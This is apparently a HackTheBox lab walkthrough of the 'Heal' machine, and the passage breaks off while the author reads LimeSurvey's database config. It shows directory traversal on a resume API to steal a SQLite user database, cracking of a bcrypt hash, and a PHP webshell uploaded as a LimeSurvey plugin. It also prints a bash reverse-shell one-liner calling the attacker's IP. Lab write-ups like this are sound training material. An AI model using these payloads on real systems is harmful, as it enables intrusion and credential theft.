---
title: HTB: Heal
url: https://0xdf.gitlab.io/2025/05/17/htb-heal.html
date: 2025-05-17T13:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, hackthebox, htb-heal, nmap, ubuntu, ffuf, subdomain, wkhtmltopdf, exiftool, feroxbuster, ruby, ruby-on-rails, sqlite, limesurvey, burp, burp-repeater, file-read, directory-traversal, hashcat, bcrypt, netexec, limesurvey-plugin, webshell, php, consul, htb-ambassador, cve-2023-35583, wireshark
---

![Heal](/img/heal-cover.png)

Heal starts off with a resume generation website that uses three domains. There’s the main site, an API, and a survey site. I’ll abuse a file read / directory traversal in the API to get access to the Ruby configuration and eventually the SQLite3 database. There I’ll get the web admin’s hash, and crack it, discovering that they use it on the LimeSurvey site as well. There I’ll build a webshell plugin to get a foothold on the box. I’ll find another shared password in the PostgreSQL config to get to the next user. For root, I’ll abuse an unauthenticated Consul instance. In Beyond Root, I’ll go way too deep into an SSRF vulnerability that didn’t work in the HTML to PDF libraries used by the site.

## Box Info

| Name | [Heal](https://hackthebox.com/machines/heal)  [Heal](https://hackthebox.com/machines/heal) [Play on HackTheBox](https://hackthebox.com/machines/heal) |
| --- | --- |
| Release Date | [14 Dec 2024](https://twitter.com/hackthebox_eu/status/1867245554595397878) |
| Retire Date | 17 May 2025 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Heal |
| Radar Graph | Radar chart for Heal |
| First Blood User | 01:12:26[zer0dave zer0dave](https://app.hackthebox.com/users/721418) |
| First Blood Root | 01:28:03[strns strns](https://app.hackthebox.com/users/1774074) |
| Creator | [rajHere rajHere](https://app.hackthebox.com/users/396413) |

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.46
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-13 20:02 UTC
Nmap scan report for 10.10.11.46
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.46
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-13 20:03 UTC
Nmap scan report for 10.10.11.46
Host is up (0.022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds

```

Based on the [OpenSSH and nginx](/cheatsheets/os#ubuntu) versions, the host is likely running Ubuntu 22.04 jammy.

The webserver on 80 is redirecting to `heal.htb`.

### Sudbomain Fuzz

I’ll use `ffuf` to bruteforce for any sudomains of `heal.htb` that respond differently from the default case:

```

oxdf@hacky$ ffuf -u http://10.10.11.46 -H "Host: FUZZ.heal.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.46
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.heal.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

api                     [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 83ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1785 req/sec :: Duration: [0:00:11] :: Errors: 0 ::

```

It finds `api.heal.htb`. I’ll add both to my `/etc/hosts` file:

```
10.10.11.46 heal.htb api.heal.htb

```

I’ll re-run `nmap -sCV -p 80` for each domain, but it doesn’t find anything extra.

### heal.htb - TCP 80

#### Site

The site is a resume builder:

![image-20250513155725329](/img/image-20250513155725329.png)

I’ll create an account, and it leads to `/resume`, where there’s a bunch of information to fill in:

![image-20250513160016298](/img/image-20250513160016298.png)

I’ll fill in some of it and hit the “Export as PDF” button, and it downloads a PDF:

![image-20250513160342343](/img/image-20250513160342343.png)

The “Survey” link at the top goes to `take-survey.heal.htb`, which I’ll add to my `hosts` file.

#### Tech Stack

The HTTP response headers show not only the nginx server, but also that the site is built with the Express JavaScript framework:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 13 May 2025 19:53:22 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: Express
Accept-Ranges: bytes
ETag: W/"688-tXvhf50YN65CYe3Yig9BzxwgBsg"
Vary: Accept-Encoding
Content-Length: 1672

```

Visiting a page that doesn’t exist returns the background with no content.

The PDF metadata shows that it was created with wkhtmltopdf:

```

oxdf@hacky$ exiftool 954cf976203548c3dc3f.pdf 
ExifTool Version Number         : 12.76
File Name                       : 954cf976203548c3dc3f.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2025:05:13 20:16:25+00:00
File Access Date/Time           : 2025:05:14 00:42:35+00:00
File Inode Change Date/Time     : 2025:05:14 00:42:34+00:00
File Permissions                : -rwxrwx---
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : 
Creator                         : wkhtmltopdf 0.12.6
Producer                        : Qt 5.15.3
Create Date                     : 2025:05:13 20:01:39Z
Page Count                      : 1

```

There is actually a potential SSRF vulnerability in `wkhtmltopdf` that’s worth exploring, but it doesn’t work in this case. I’ll poke at it in [Beyond Root](#beyond-root---wkhtmltopdf-ssrf).

#### Directory Bruteforce

Brute-forcing on the site returns a ton of 503s if I get above a certain speed. With `feroxbuster`, I’ll use `-t 20` to limit the speed, and `-n` to prevent recurrsion:

```

oxdf@hacky$ feroxbuster -u http://heal.htb -t 20 -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://heal.htb
 🚀  Threads               │ 20
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       42l      199w     1672c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[####################] - 50m    30000/30000   0s      found:0       errors:0      
[####################] - 50m    30000/30000   10/s    http://heal.htb/ 

```

It finds nothing.

### api.heal.htb - TCP 80

#### Endpoints Used by heal.htb

In interacting with the main site, there are a few times requests are made in the background to `api.heal.htb`, which I’ll observe by looking at the proxy history in Burp.
- On logging in, there’s a POST to `/signin`, which returns 401 unauthorized for incorrect credentials, and a 200 with a JWT token in a JSON body for correct credentials.
- There’s a GET to `/resume` which seems to always return empty.
- Viewing the profile page sends a request to `/profile` which returns a JSON body with user information.

  ```

  {"id":2,"email":"0xdf@heal.htb","fullname":"0xdf","username":"0xdf","is_admin":false}

  ```
- When I export to PDF, there’s a POST to `/exports` with a JSON body with two keys. `content` has HTML content that will become the PDF. `format` is always “pdf”. The response on success contains the filename of the result:

  ```

  {"message":"PDF created successfully","filename":"0f990c2d8108d34b184c.pdf"}

  ```
- Immediately after, there’s a request to `/download?filename=<filename>`, which returns the PDF.

#### Tech Stack

Visiting `/` returns a [Ruby on Rails](https://rubyonrails.org/) status page:

![image-20250513205750943](/img/image-20250513205750943.png)

The HTTP headers don’t explicitly say anything about what’s in use:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 14 May 2025 00:56:58 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
etag: W/"22d8bc38737b0109d55ab08419d31ee3"
cache-control: max-age=0, private, must-revalidate
x-request-id: 9129730d-7528-4329-9494-6356644ceb70
x-runtime: 0.004555
vary: Origin
Content-Length: 12515

```

Some of those unique headers may be standard to some framework. `x-runtime` is very common in Ruby on Rails.

### take-survey.heal.htb

#### Site

Visiting `/` returns a LimeSurvey page:

![image-20250513205916303](/img/image-20250513205916303.png)

The admin’s email is `ralph@heal.htb`.

The link on `heal.htb` goes to `/index.php/552933?lang=en`, which presents a survey:

![image-20250513210034856](/img/image-20250513210034856.png)

As the intro says, there’s only one question:

![image-20250513210052684](/img/image-20250513210052684.png)

On clicking submit it says thanks:

![image-20250513210111447](/img/image-20250513210111447.png)

#### Tech Stack

The HTTP response headers have some new headers:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 14 May 2025 01:00:25 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
P3P: CP="IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT"
Expires: Mon, 26 Jul 1997 05:00:00 GMT
Last-Modified: Wed, 14 May 2025 01:00:25 GMT
Cache-Control: no-store, no-cache, must-revalidate
Set-Cookie: LS-ZNIDJBOXUNKXWTIP=mp0vuns7gkh3d5kfljvgmp1ign; path=/; HttpOnly
Set-Cookie: YII_CSRF_TOKEN=aVd-aXVEb1ZXaDB5QzlVcGZIaTB-VjhHSDdsVjFrbUH2m43GB-3zYQKfg4QADLqMmrfQvQuJagdtPDjRIdU1xg%3D%3D; path=/; HttpOnly; SameSite=Lax
Content-Length: 16841

```

Other than that I just know it’s LimeSurvey which is PHP. Visiting a non-existent page returns a custom LimeSurvey 404 page.

#### Directory Bruteforce

`feroxbuster` finds a good number of paths here (still running thread limited and with no recursion):

```

oxdf@hacky$ feroxbuster -u http://take-survey.heal.htb -t 10 -n --dont-extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://take-survey.heal.htb
 🚀  Threads               │ 10
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET      101l      306w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     1085l     4127w    75816c http://take-survey.heal.htb/
301      GET        7l       12w      178c http://take-survey.heal.htb/modules => http://take-survey.heal.htb/modules/
301      GET        7l       12w      178c http://take-survey.heal.htb/admin => http://take-survey.heal.htb/admin/
301      GET        7l       12w      178c http://take-survey.heal.htb/tmp => http://take-survey.heal.htb/tmp/
301      GET        7l       12w      178c http://take-survey.heal.htb/plugins => http://take-survey.heal.htb/plugins/
301      GET        7l       12w      178c http://take-survey.heal.htb/themes => http://take-survey.heal.htb/themes/
301      GET        7l       12w      178c http://take-survey.heal.htb/editor => http://take-survey.heal.htb/editor/
301      GET        7l       12w      178c http://take-survey.heal.htb/docs => http://take-survey.heal.htb/docs/
301      GET        7l       12w      178c http://take-survey.heal.htb/assets => http://take-survey.heal.htb/assets/
301      GET        7l       12w      178c http://take-survey.heal.htb/upload => http://take-survey.heal.htb/upload/
302      GET        0l        0w        0c http://take-survey.heal.htb/Admin => http://take-survey.heal.htb/index.php/admin/authentication/sa/login
301      GET        7l       12w      178c http://take-survey.heal.htb/application => http://take-survey.heal.htb/application/
200      GET     1085l     4127w    75816c http://take-survey.heal.htb/surveys
301      GET        7l       12w      178c http://take-survey.heal.htb/installer => http://take-survey.heal.htb/installer/
301      GET        7l       12w      178c http://take-survey.heal.htb/locale => http://take-survey.heal.htb/locale/
500      GET        1l        2w       45c http://take-survey.heal.htb/restricted
301      GET        7l       12w      178c http://take-survey.heal.htb/vendor => http://take-survey.heal.htb/vendor/
500      GET        1l        2w       45c http://take-survey.heal.htb/rest
500      GET        1l        2w       45c http://take-survey.heal.htb/restaurants
401      GET      100l      294w     4569c http://take-survey.heal.htb/uploader
500      GET        1l        2w       45c http://take-survey.heal.htb/restaurant
200      GET     1085l     4127w    75816c http://take-survey.heal.htb/Surveys
500      GET        1l        2w       45c http://take-survey.heal.htb/restore
200      GET      974l     8007w    49474c http://take-survey.heal.htb/LICENSE
302      GET        0l        0w        0c http://take-survey.heal.htb/responses => http://take-survey.heal.htb/index.php/admin/authentication/sa/login
302      GET        0l        0w        0c http://take-survey.heal.htb/Plugins => http://take-survey.heal.htb/index.php/admin/pluginmanager/sa/index
302      GET        0l        0w        0c http://take-survey.heal.htb/optout => http://take-survey.heal.htb/index.php
302      GET        0l        0w        0c http://take-survey.heal.htb/option => http://take-survey.heal.htb/index.php
500      GET      100l      295w     4617c http://take-survey.heal.htb/Installer
302      GET        0l        0w        0c http://take-survey.heal.htb/assessment => http://take-survey.heal.htb/index.php/admin/authentication/sa/login
500      GET        1l        2w       45c http://take-survey.heal.htb/restrito
500      GET        1l        2w       45c http://take-survey.heal.htb/restaurantes
500      GET        1l        2w       45c http://take-survey.heal.htb/restrict
302      GET        0l        0w        0c http://take-survey.heal.htb/Option => http://take-survey.heal.htb/index.php
302      GET        0l        0w        0c http://take-survey.heal.htb/Responses => http://take-survey.heal.htb/index.php/admin/authentication/sa/login
500      GET        1l        2w       45c http://take-survey.heal.htb/restaurante
500      GET        1l        2w       45c http://take-survey.heal.htb/restrictor_log
302      GET        0l        0w        0c http://take-survey.heal.htb/Assessment => http://take-survey.heal.htb/index.php/admin/authentication/sa/login
401      GET      100l      294w     4569c http://take-survey.heal.htb/Uploader
302      GET        0l        0w        0c http://take-survey.heal.htb/UserManagement => http://take-survey.heal.htb/index.php/admin/authentication/sa/login
500      GET        1l        2w       45c http://take-survey.heal.htb/restaurantfinder
500      GET        1l        2w       45c http://take-survey.heal.htb/restoration
[####################] - 51m    30000/30000   0s      found:42      errors:0
[####################] - 51m    30000/30000   10/s    http://take-survey.heal.htb/ 

```

It seems anything starting with “rest” is blocked with a 500. Most of these return 403 Forbidden. The most interesting is `/admin`, which presents the LimeSurvey Login page:

![image-20250513211331247](/img/image-20250513211331247.png)

## Shell as www-data

### Access API DB

#### Identify Directory Traversal / File Read

The `/download` endpoint jumps right out as taking a filename and returning a file. I’ll send that request to Burp Repeater. I’ll notice that my auth token is included in the `Authorization` header. I’ll change the filename to `/etc/passwd`, and it works:

![image-20250514060529625](/img/image-20250514060529625.png)

It also works using relative paths:

![image-20250514061624554](/img/image-20250514061624554.png)

I’ll note users ron and ralph.

#### Rails Enumeration

[This guided](https://guides.rubyonrails.org/configuring.html) from Rails talks about how to configure a Rails application. It starts with `config/application.rb`. I’ll find that two directories up from the current directory:

![image-20250514070426689](/img/image-20250514070426689.png)

There’s nothing too interesting here, but it does give me a reference point to work from.

There’s a “Configuring a Database” section, which references `config/database.yml`. I’ll grab that:

```

# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3

```

There are two `.sqlite3` files mentioned. I’ll download both using `curl`:

```

oxdf@hacky$ curl --path-as-is -s -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 'http://api.heal.htb/download?filename=../../storage/development.sqlite3' --output development.sqlite3
oxdf@hacky$ file development.sqlite3
development.sqlite3: SQLite 3.x database, last written using SQLite version 3045002, writer version 2, read version 2, file counter 2, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 2
oxdf@hacky$ curl --path-as-is -s -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 'http://api.heal.htb/download?filename=../../storage/test.sqlite3' --output test.sqlite3
oxdf@hacky$ file test.sqlite3
test.sqlite3: SQLite 3.x database, last written using SQLite version 3045002, writer version 2, read version 2, file counter 2, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 2

```

### LimeSurvey Access

#### DB Enumeration

The `test.sqlite3` file has a table structure, but no data in it. `development.sqlite3` has data. I’ll connect:

```

oxdf@hacky$ sqlite3 development.sqlite3 
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
ar_internal_metadata  token_blacklists    
schema_migrations     users

```

The interesting table is `users`:

```

sqlite> .headers on
sqlite> select * from users;
id|email|password_digest|created_at|updated_at|fullname|username|is_admin
1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
2|0xdf@heal.htb|$2a$12$lD1YI0oRzsxBCPcrctIE7ey7qqxJXEFaua77bPS63PTzSJrrkL5ui|2025-05-13 19:59:46.522875|2025-05-13 19:59:46.522875|0xdf|0xdf|0

```

There are two users, one of which is me. The other is ralph, the user mentioned as admin on the LimeSurvey page.

#### Crack Hash

`hashcat` auto-discovery will find four possible hash types:

```

$ hashcat ralph.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].
...[snip]...

```

Always best to try plain brcypt unless there’s reason to know otherwise:

```

$ hashcat ralph.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 3200
hashcat (v6.2.6) starting
...[snip]...
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG:147258369
...[snip]...

```

#### Log In

I noted above that ralph was a user on the box, but the password doesn’t work to log in as ralph over SSH:

```

oxdf@hacky$ netexec ssh heal.htb -u ralph -p 147258369
SSH         10.10.11.46     22     heal.htb         [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
SSH         10.10.11.46     22     heal.htb         [-] ralph:147258369

```

It does work to log into `heal.htb` as ralph (which makes sense since that’s where the hash is used):

![image-20250514083806793](/img/image-20250514083806793.png)

There’s nothing interesting here.

ralph does reuse their password on LimeSurvey:

![image-20250514112711007](/img/image-20250514112711007.png)

The page footer shows the LimeSurvey version is 6.6.4.

### Alternative Hash Read

Got an email after the original publication of this post from 0xSirius and Artu. They found that they could Read the hash directly from the `/proc` filesystem by fuzzing the open file descriptors for the current web process. I’ll take a quick dive into that in [this video](https://www.youtube.com/watch?v=BZnqipkXd88):

![image-20250519162718939](/img/image-20250519162718939.png)

With this, I can skip enumerating Ruby and just move onto LimeSurvey:

```

flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A[<a href="#identify-directory-traversal--file-read">File Read Vulnerability</a>]-->B(<a href='#rails-enumeration'>Enumerate Rail Application\nin zmupdate.pl</a>);
    B-->C(<a href="#db-enumeration">DB Enumeration</a>);
    C-->D(<a href="#crack-hash">Crack Hash</a>);
    D-->E[<a href="#log-in">LimeSurvey Access</a>];
    A-->F(<a href="#alternative-hash-read">Read /proc fds</a>);
    F-->D;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,6,7 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

### LimeSurvey RCE

#### Upload Plugin

In searching for CVEs, there are none at this time that are not patches in this version. LimeSurvey has a plugin system. There’s a bunch of documentation in the [LimeSurveyManual](https://www.limesurvey.org/manual/Plugins_-_advanced), but I won’t need most of it.

In the configuration menu at the top, there’s a “Plugins” option:

![image-20250514114736547](/img/image-20250514114736547.png)

Plugins are always a good target, as they likely run PHP code. At the top right of the plugins page there’s an “Upload & install” button. Clicking it pops a form asking for a Zip file:

![image-20250514114842286](/img/image-20250514114842286.png)

I’ll write a simple PHP webshell in `0xdf.php`:

```

<?php system($_REQUEST['cmd']); ?>

```

I’ll add it to a Zip file:

```

oxdf@hacky$ zip 0xdf.zip 0xdf.php 
  adding: 0xdf.php (stored 0%)

```

Trying to upload this returns the following message:

![image-20250514115017617](/img/image-20250514115017617.png)

The documentation has a link to [an example config file](https://gitlab.com/SondagesPro/SampleAndDemo/ExampleSettings/-/blob/master/config.xml?ref_type=heads). I’ll grab that, save it to my host, and add it to the Zip file:

```

oxdf@hacky$ vim config.xml 
oxdf@hacky$ zip 0xdf.zip config.xml 
  adding: config.xml (deflated 53%)

```

Now uploading leads to:

![image-20250514115153679](/img/image-20250514115153679.png)

I’ll click “Install”. It shows up in the list with the name from the `config.xml` file:

![image-20250514115334918](/img/image-20250514115334918.png)

#### Find Plugin

Looking around the file structure of LimeSurvey on [GitHub](https://github.com/LimeSurvey/LimeSurvey), there’s a `upload/plugins` directory:

![image-20250514115538665](/img/image-20250514115538665.png)

Visiting `/upload/plugins/ExampleSettings/` returns a 403, which is a good sign there’s something there. Visiting something else in that directory returns 404. Visiting `0xdf.php?cmd=id` shows RCE:

![image-20250514115656260](/img/image-20250514115656260.png)

Alternatively, there are repos out there with an example plugin to get RCE that also show how to do this. Some reference [CVE-2021-44967](https://nvd.nist.gov/vuln/detail/CVE-2021-44967), which isn’t really a CVE. In fact, the NIST description includes:

> NOTE: the Supplier’s position is that plugins intentionally can contain arbitrary PHP code, and can only be installed by a superadmin, and therefore the security model is not violated by this finding.

This isn’t a patchable vulnerability, but rather a fact that if someone can upload plugins, they effectively are in control of the machine.

#### Shell

I’ll add a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) to the `cmd` parameter in the URL like `0xdf.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'`. I’ll have to URL encode the `&` to `%26`, but the rest Firefox will handle for me. On submitting, it hangs, and there’s a shell at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.46 47880
bash: cannot set terminal process group (1114): Inappropriate ioctl for device
bash: no job control in this shell
www-data@heal:~/limesurvey/upload/plugins/ExampleSettings$

```

I’ll upgrade my shell with [the standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```

www-data@heal:~/limesurvey/upload/plugins/ExampleSettings$ script /dev/null -c bash
<d/plugins/ExampleSettings$ script /dev/null -c bash        
Script started, output log file is '/dev/null'.
www-data@heal:~/limesurvey/upload/plugins/ExampleSettings$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@heal:~/limesurvey/upload/plugins/ExampleSettings$

```

## Shell as ron

### Enumeration

#### Users

There are two users with home directories on Heal:

```

www-data@heal:~$ ls /home/
ralph  ron

```

www-data has no access to either.

There’s one other non-root user with a shell configured, postgres, which is weird, but probably not meaningful:

```

www-data@heal:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ron:x:1001:1001:,,,:/home/ron:/bin/bash

```

#### Web Configuration

There are three configured sites for nginx:

```

www-data@heal:/etc/nginx/sites-enabled$ ls
api.heal.htb  heal.htb  lime-survey.htb

```

`lime-survey` is configured to run from `/var/www/limesurvey`, and processes PHP:

```

server {
    listen 80;
    server_name take-survey.heal.htb;

    root /var/www/limesurvey;
    index index.php index.html index.htm;

    location / {
        limit_req zone=mylimit burst=20;
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        limit_req zone=mylimit burst=20;
        include fastcgi_params;
        fastcgi_pass unix:/var/run/php/php8.1-fpm.sock; # Update to match your PHP-FPM version
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }

    location ~ /\.ht {
        deny all;
    }
}

```

`heal.htb` has the redirect to `heal.htb` for anything without a valid host header, and passes traffic on to localhost:3000:

```

#limit_req_zone $binary_remote_addr zone=heallimit:10m rate=10r/s;

server {
    listen 80;
    server_name heal.htb;

    # Redirect users accessing the site via the server's IP address
    if ($host != heal.htb) {
        rewrite ^ http://heal.htb/;
    }

    # Proxy requests to the Flask server
    location / {
        limit_req zone=mylimit burst=20;
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

# Default server block for IP-based access
server {
    listen 80 default_server;
    server_name _;

    # Redirect all IP-based requests to clouded.htb
    return 301 http://heal.htb/;
}

```

`api.head.htb` proxies traffic to port 3001:

```

limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;

server {
    listen 80;
    server_name api.heal.htb;

    # Proxy requests to the Flask server
    location / {
        limit_req zone=mylimit burst=20;
        proxy_pass http://127.0.0.1:3001;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

```

Looking at the processes, it looks like 3001 is a [puma](https://puma.io/) Ruby web server and 3000 is a `node` JavaScript server:

```

www-data@heal:/etc/nginx/sites-enabled$ ps auxww | grep -e 'node ' -e puma
ralph       1307  0.0  2.5 698012 101388 ?       Sl   May13   0:16 puma 6.4.3 (tcp://127.0.0.1:3001) [resume_api]
ralph       1469  0.0  1.1 791276 44240 ?        Sl   May13   0:00 node /home/ralph/resume-builder/node_modules/.bin/react-scripts start
ralph       1481  0.3  4.8 1405100 193016 ?      Sl   May13   3:48 node /home/ralph/resume-builder/node_modules/react-scripts/scripts/start.js
ralph       1491  0.0  2.7 1441236 109024 ?      Sl   May13   0:16 puma: cluster worker 0: 1307 [resume_api]
ralph       1495  0.0  2.7 1441108 108368 ?      Sl   May13   0:16 puma: cluster worker 1: 1307 [resume_api]

```

The `node` site seems to be running from ralph’s home directory.

#### LimeSurvey

The LimeSurvey installation is in `/var/www/limesurvey`:

```

www-data@heal:~/limesurvey$ ls
LICENSE      assets       installer         plugins           themes
README.md    docs         locale            psalm-all.xml     tmp
SECURITY.md  editor       modules           psalm-strict.xml  upload
admin        gulpfile.js  node_modules      psalm.xml         vendor
application  index.php    open-api-gen.php  setdebug.php

```

Configuration is handled from `application/config`:

```

www-data@heal:~/limesurvey/application/config$ ls
config-defaults.php       console.php   packages.php       tcpdf.php
config-sample-dblib.php   email.php     questiontypes.php  updater_version.php
config-sample-mysql.php   fonts.php     rest               vendor.php
config-sample-pgsql.php   index.html    rest.php           version.php
config-sample-sqlsrv.php  internal.php  routes.php
config.php                ldap.php      security.php

```

At the top of `config.php` is the database config information:

```

<?php if (!defined('BASEPATH')) exit('No direct script access allowed');                                              
/*                                                         
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS        
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|                 
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|    'connectionString' Hostname, database, port and database type for
|     the connection. Driver example: mysql. Currently supported:
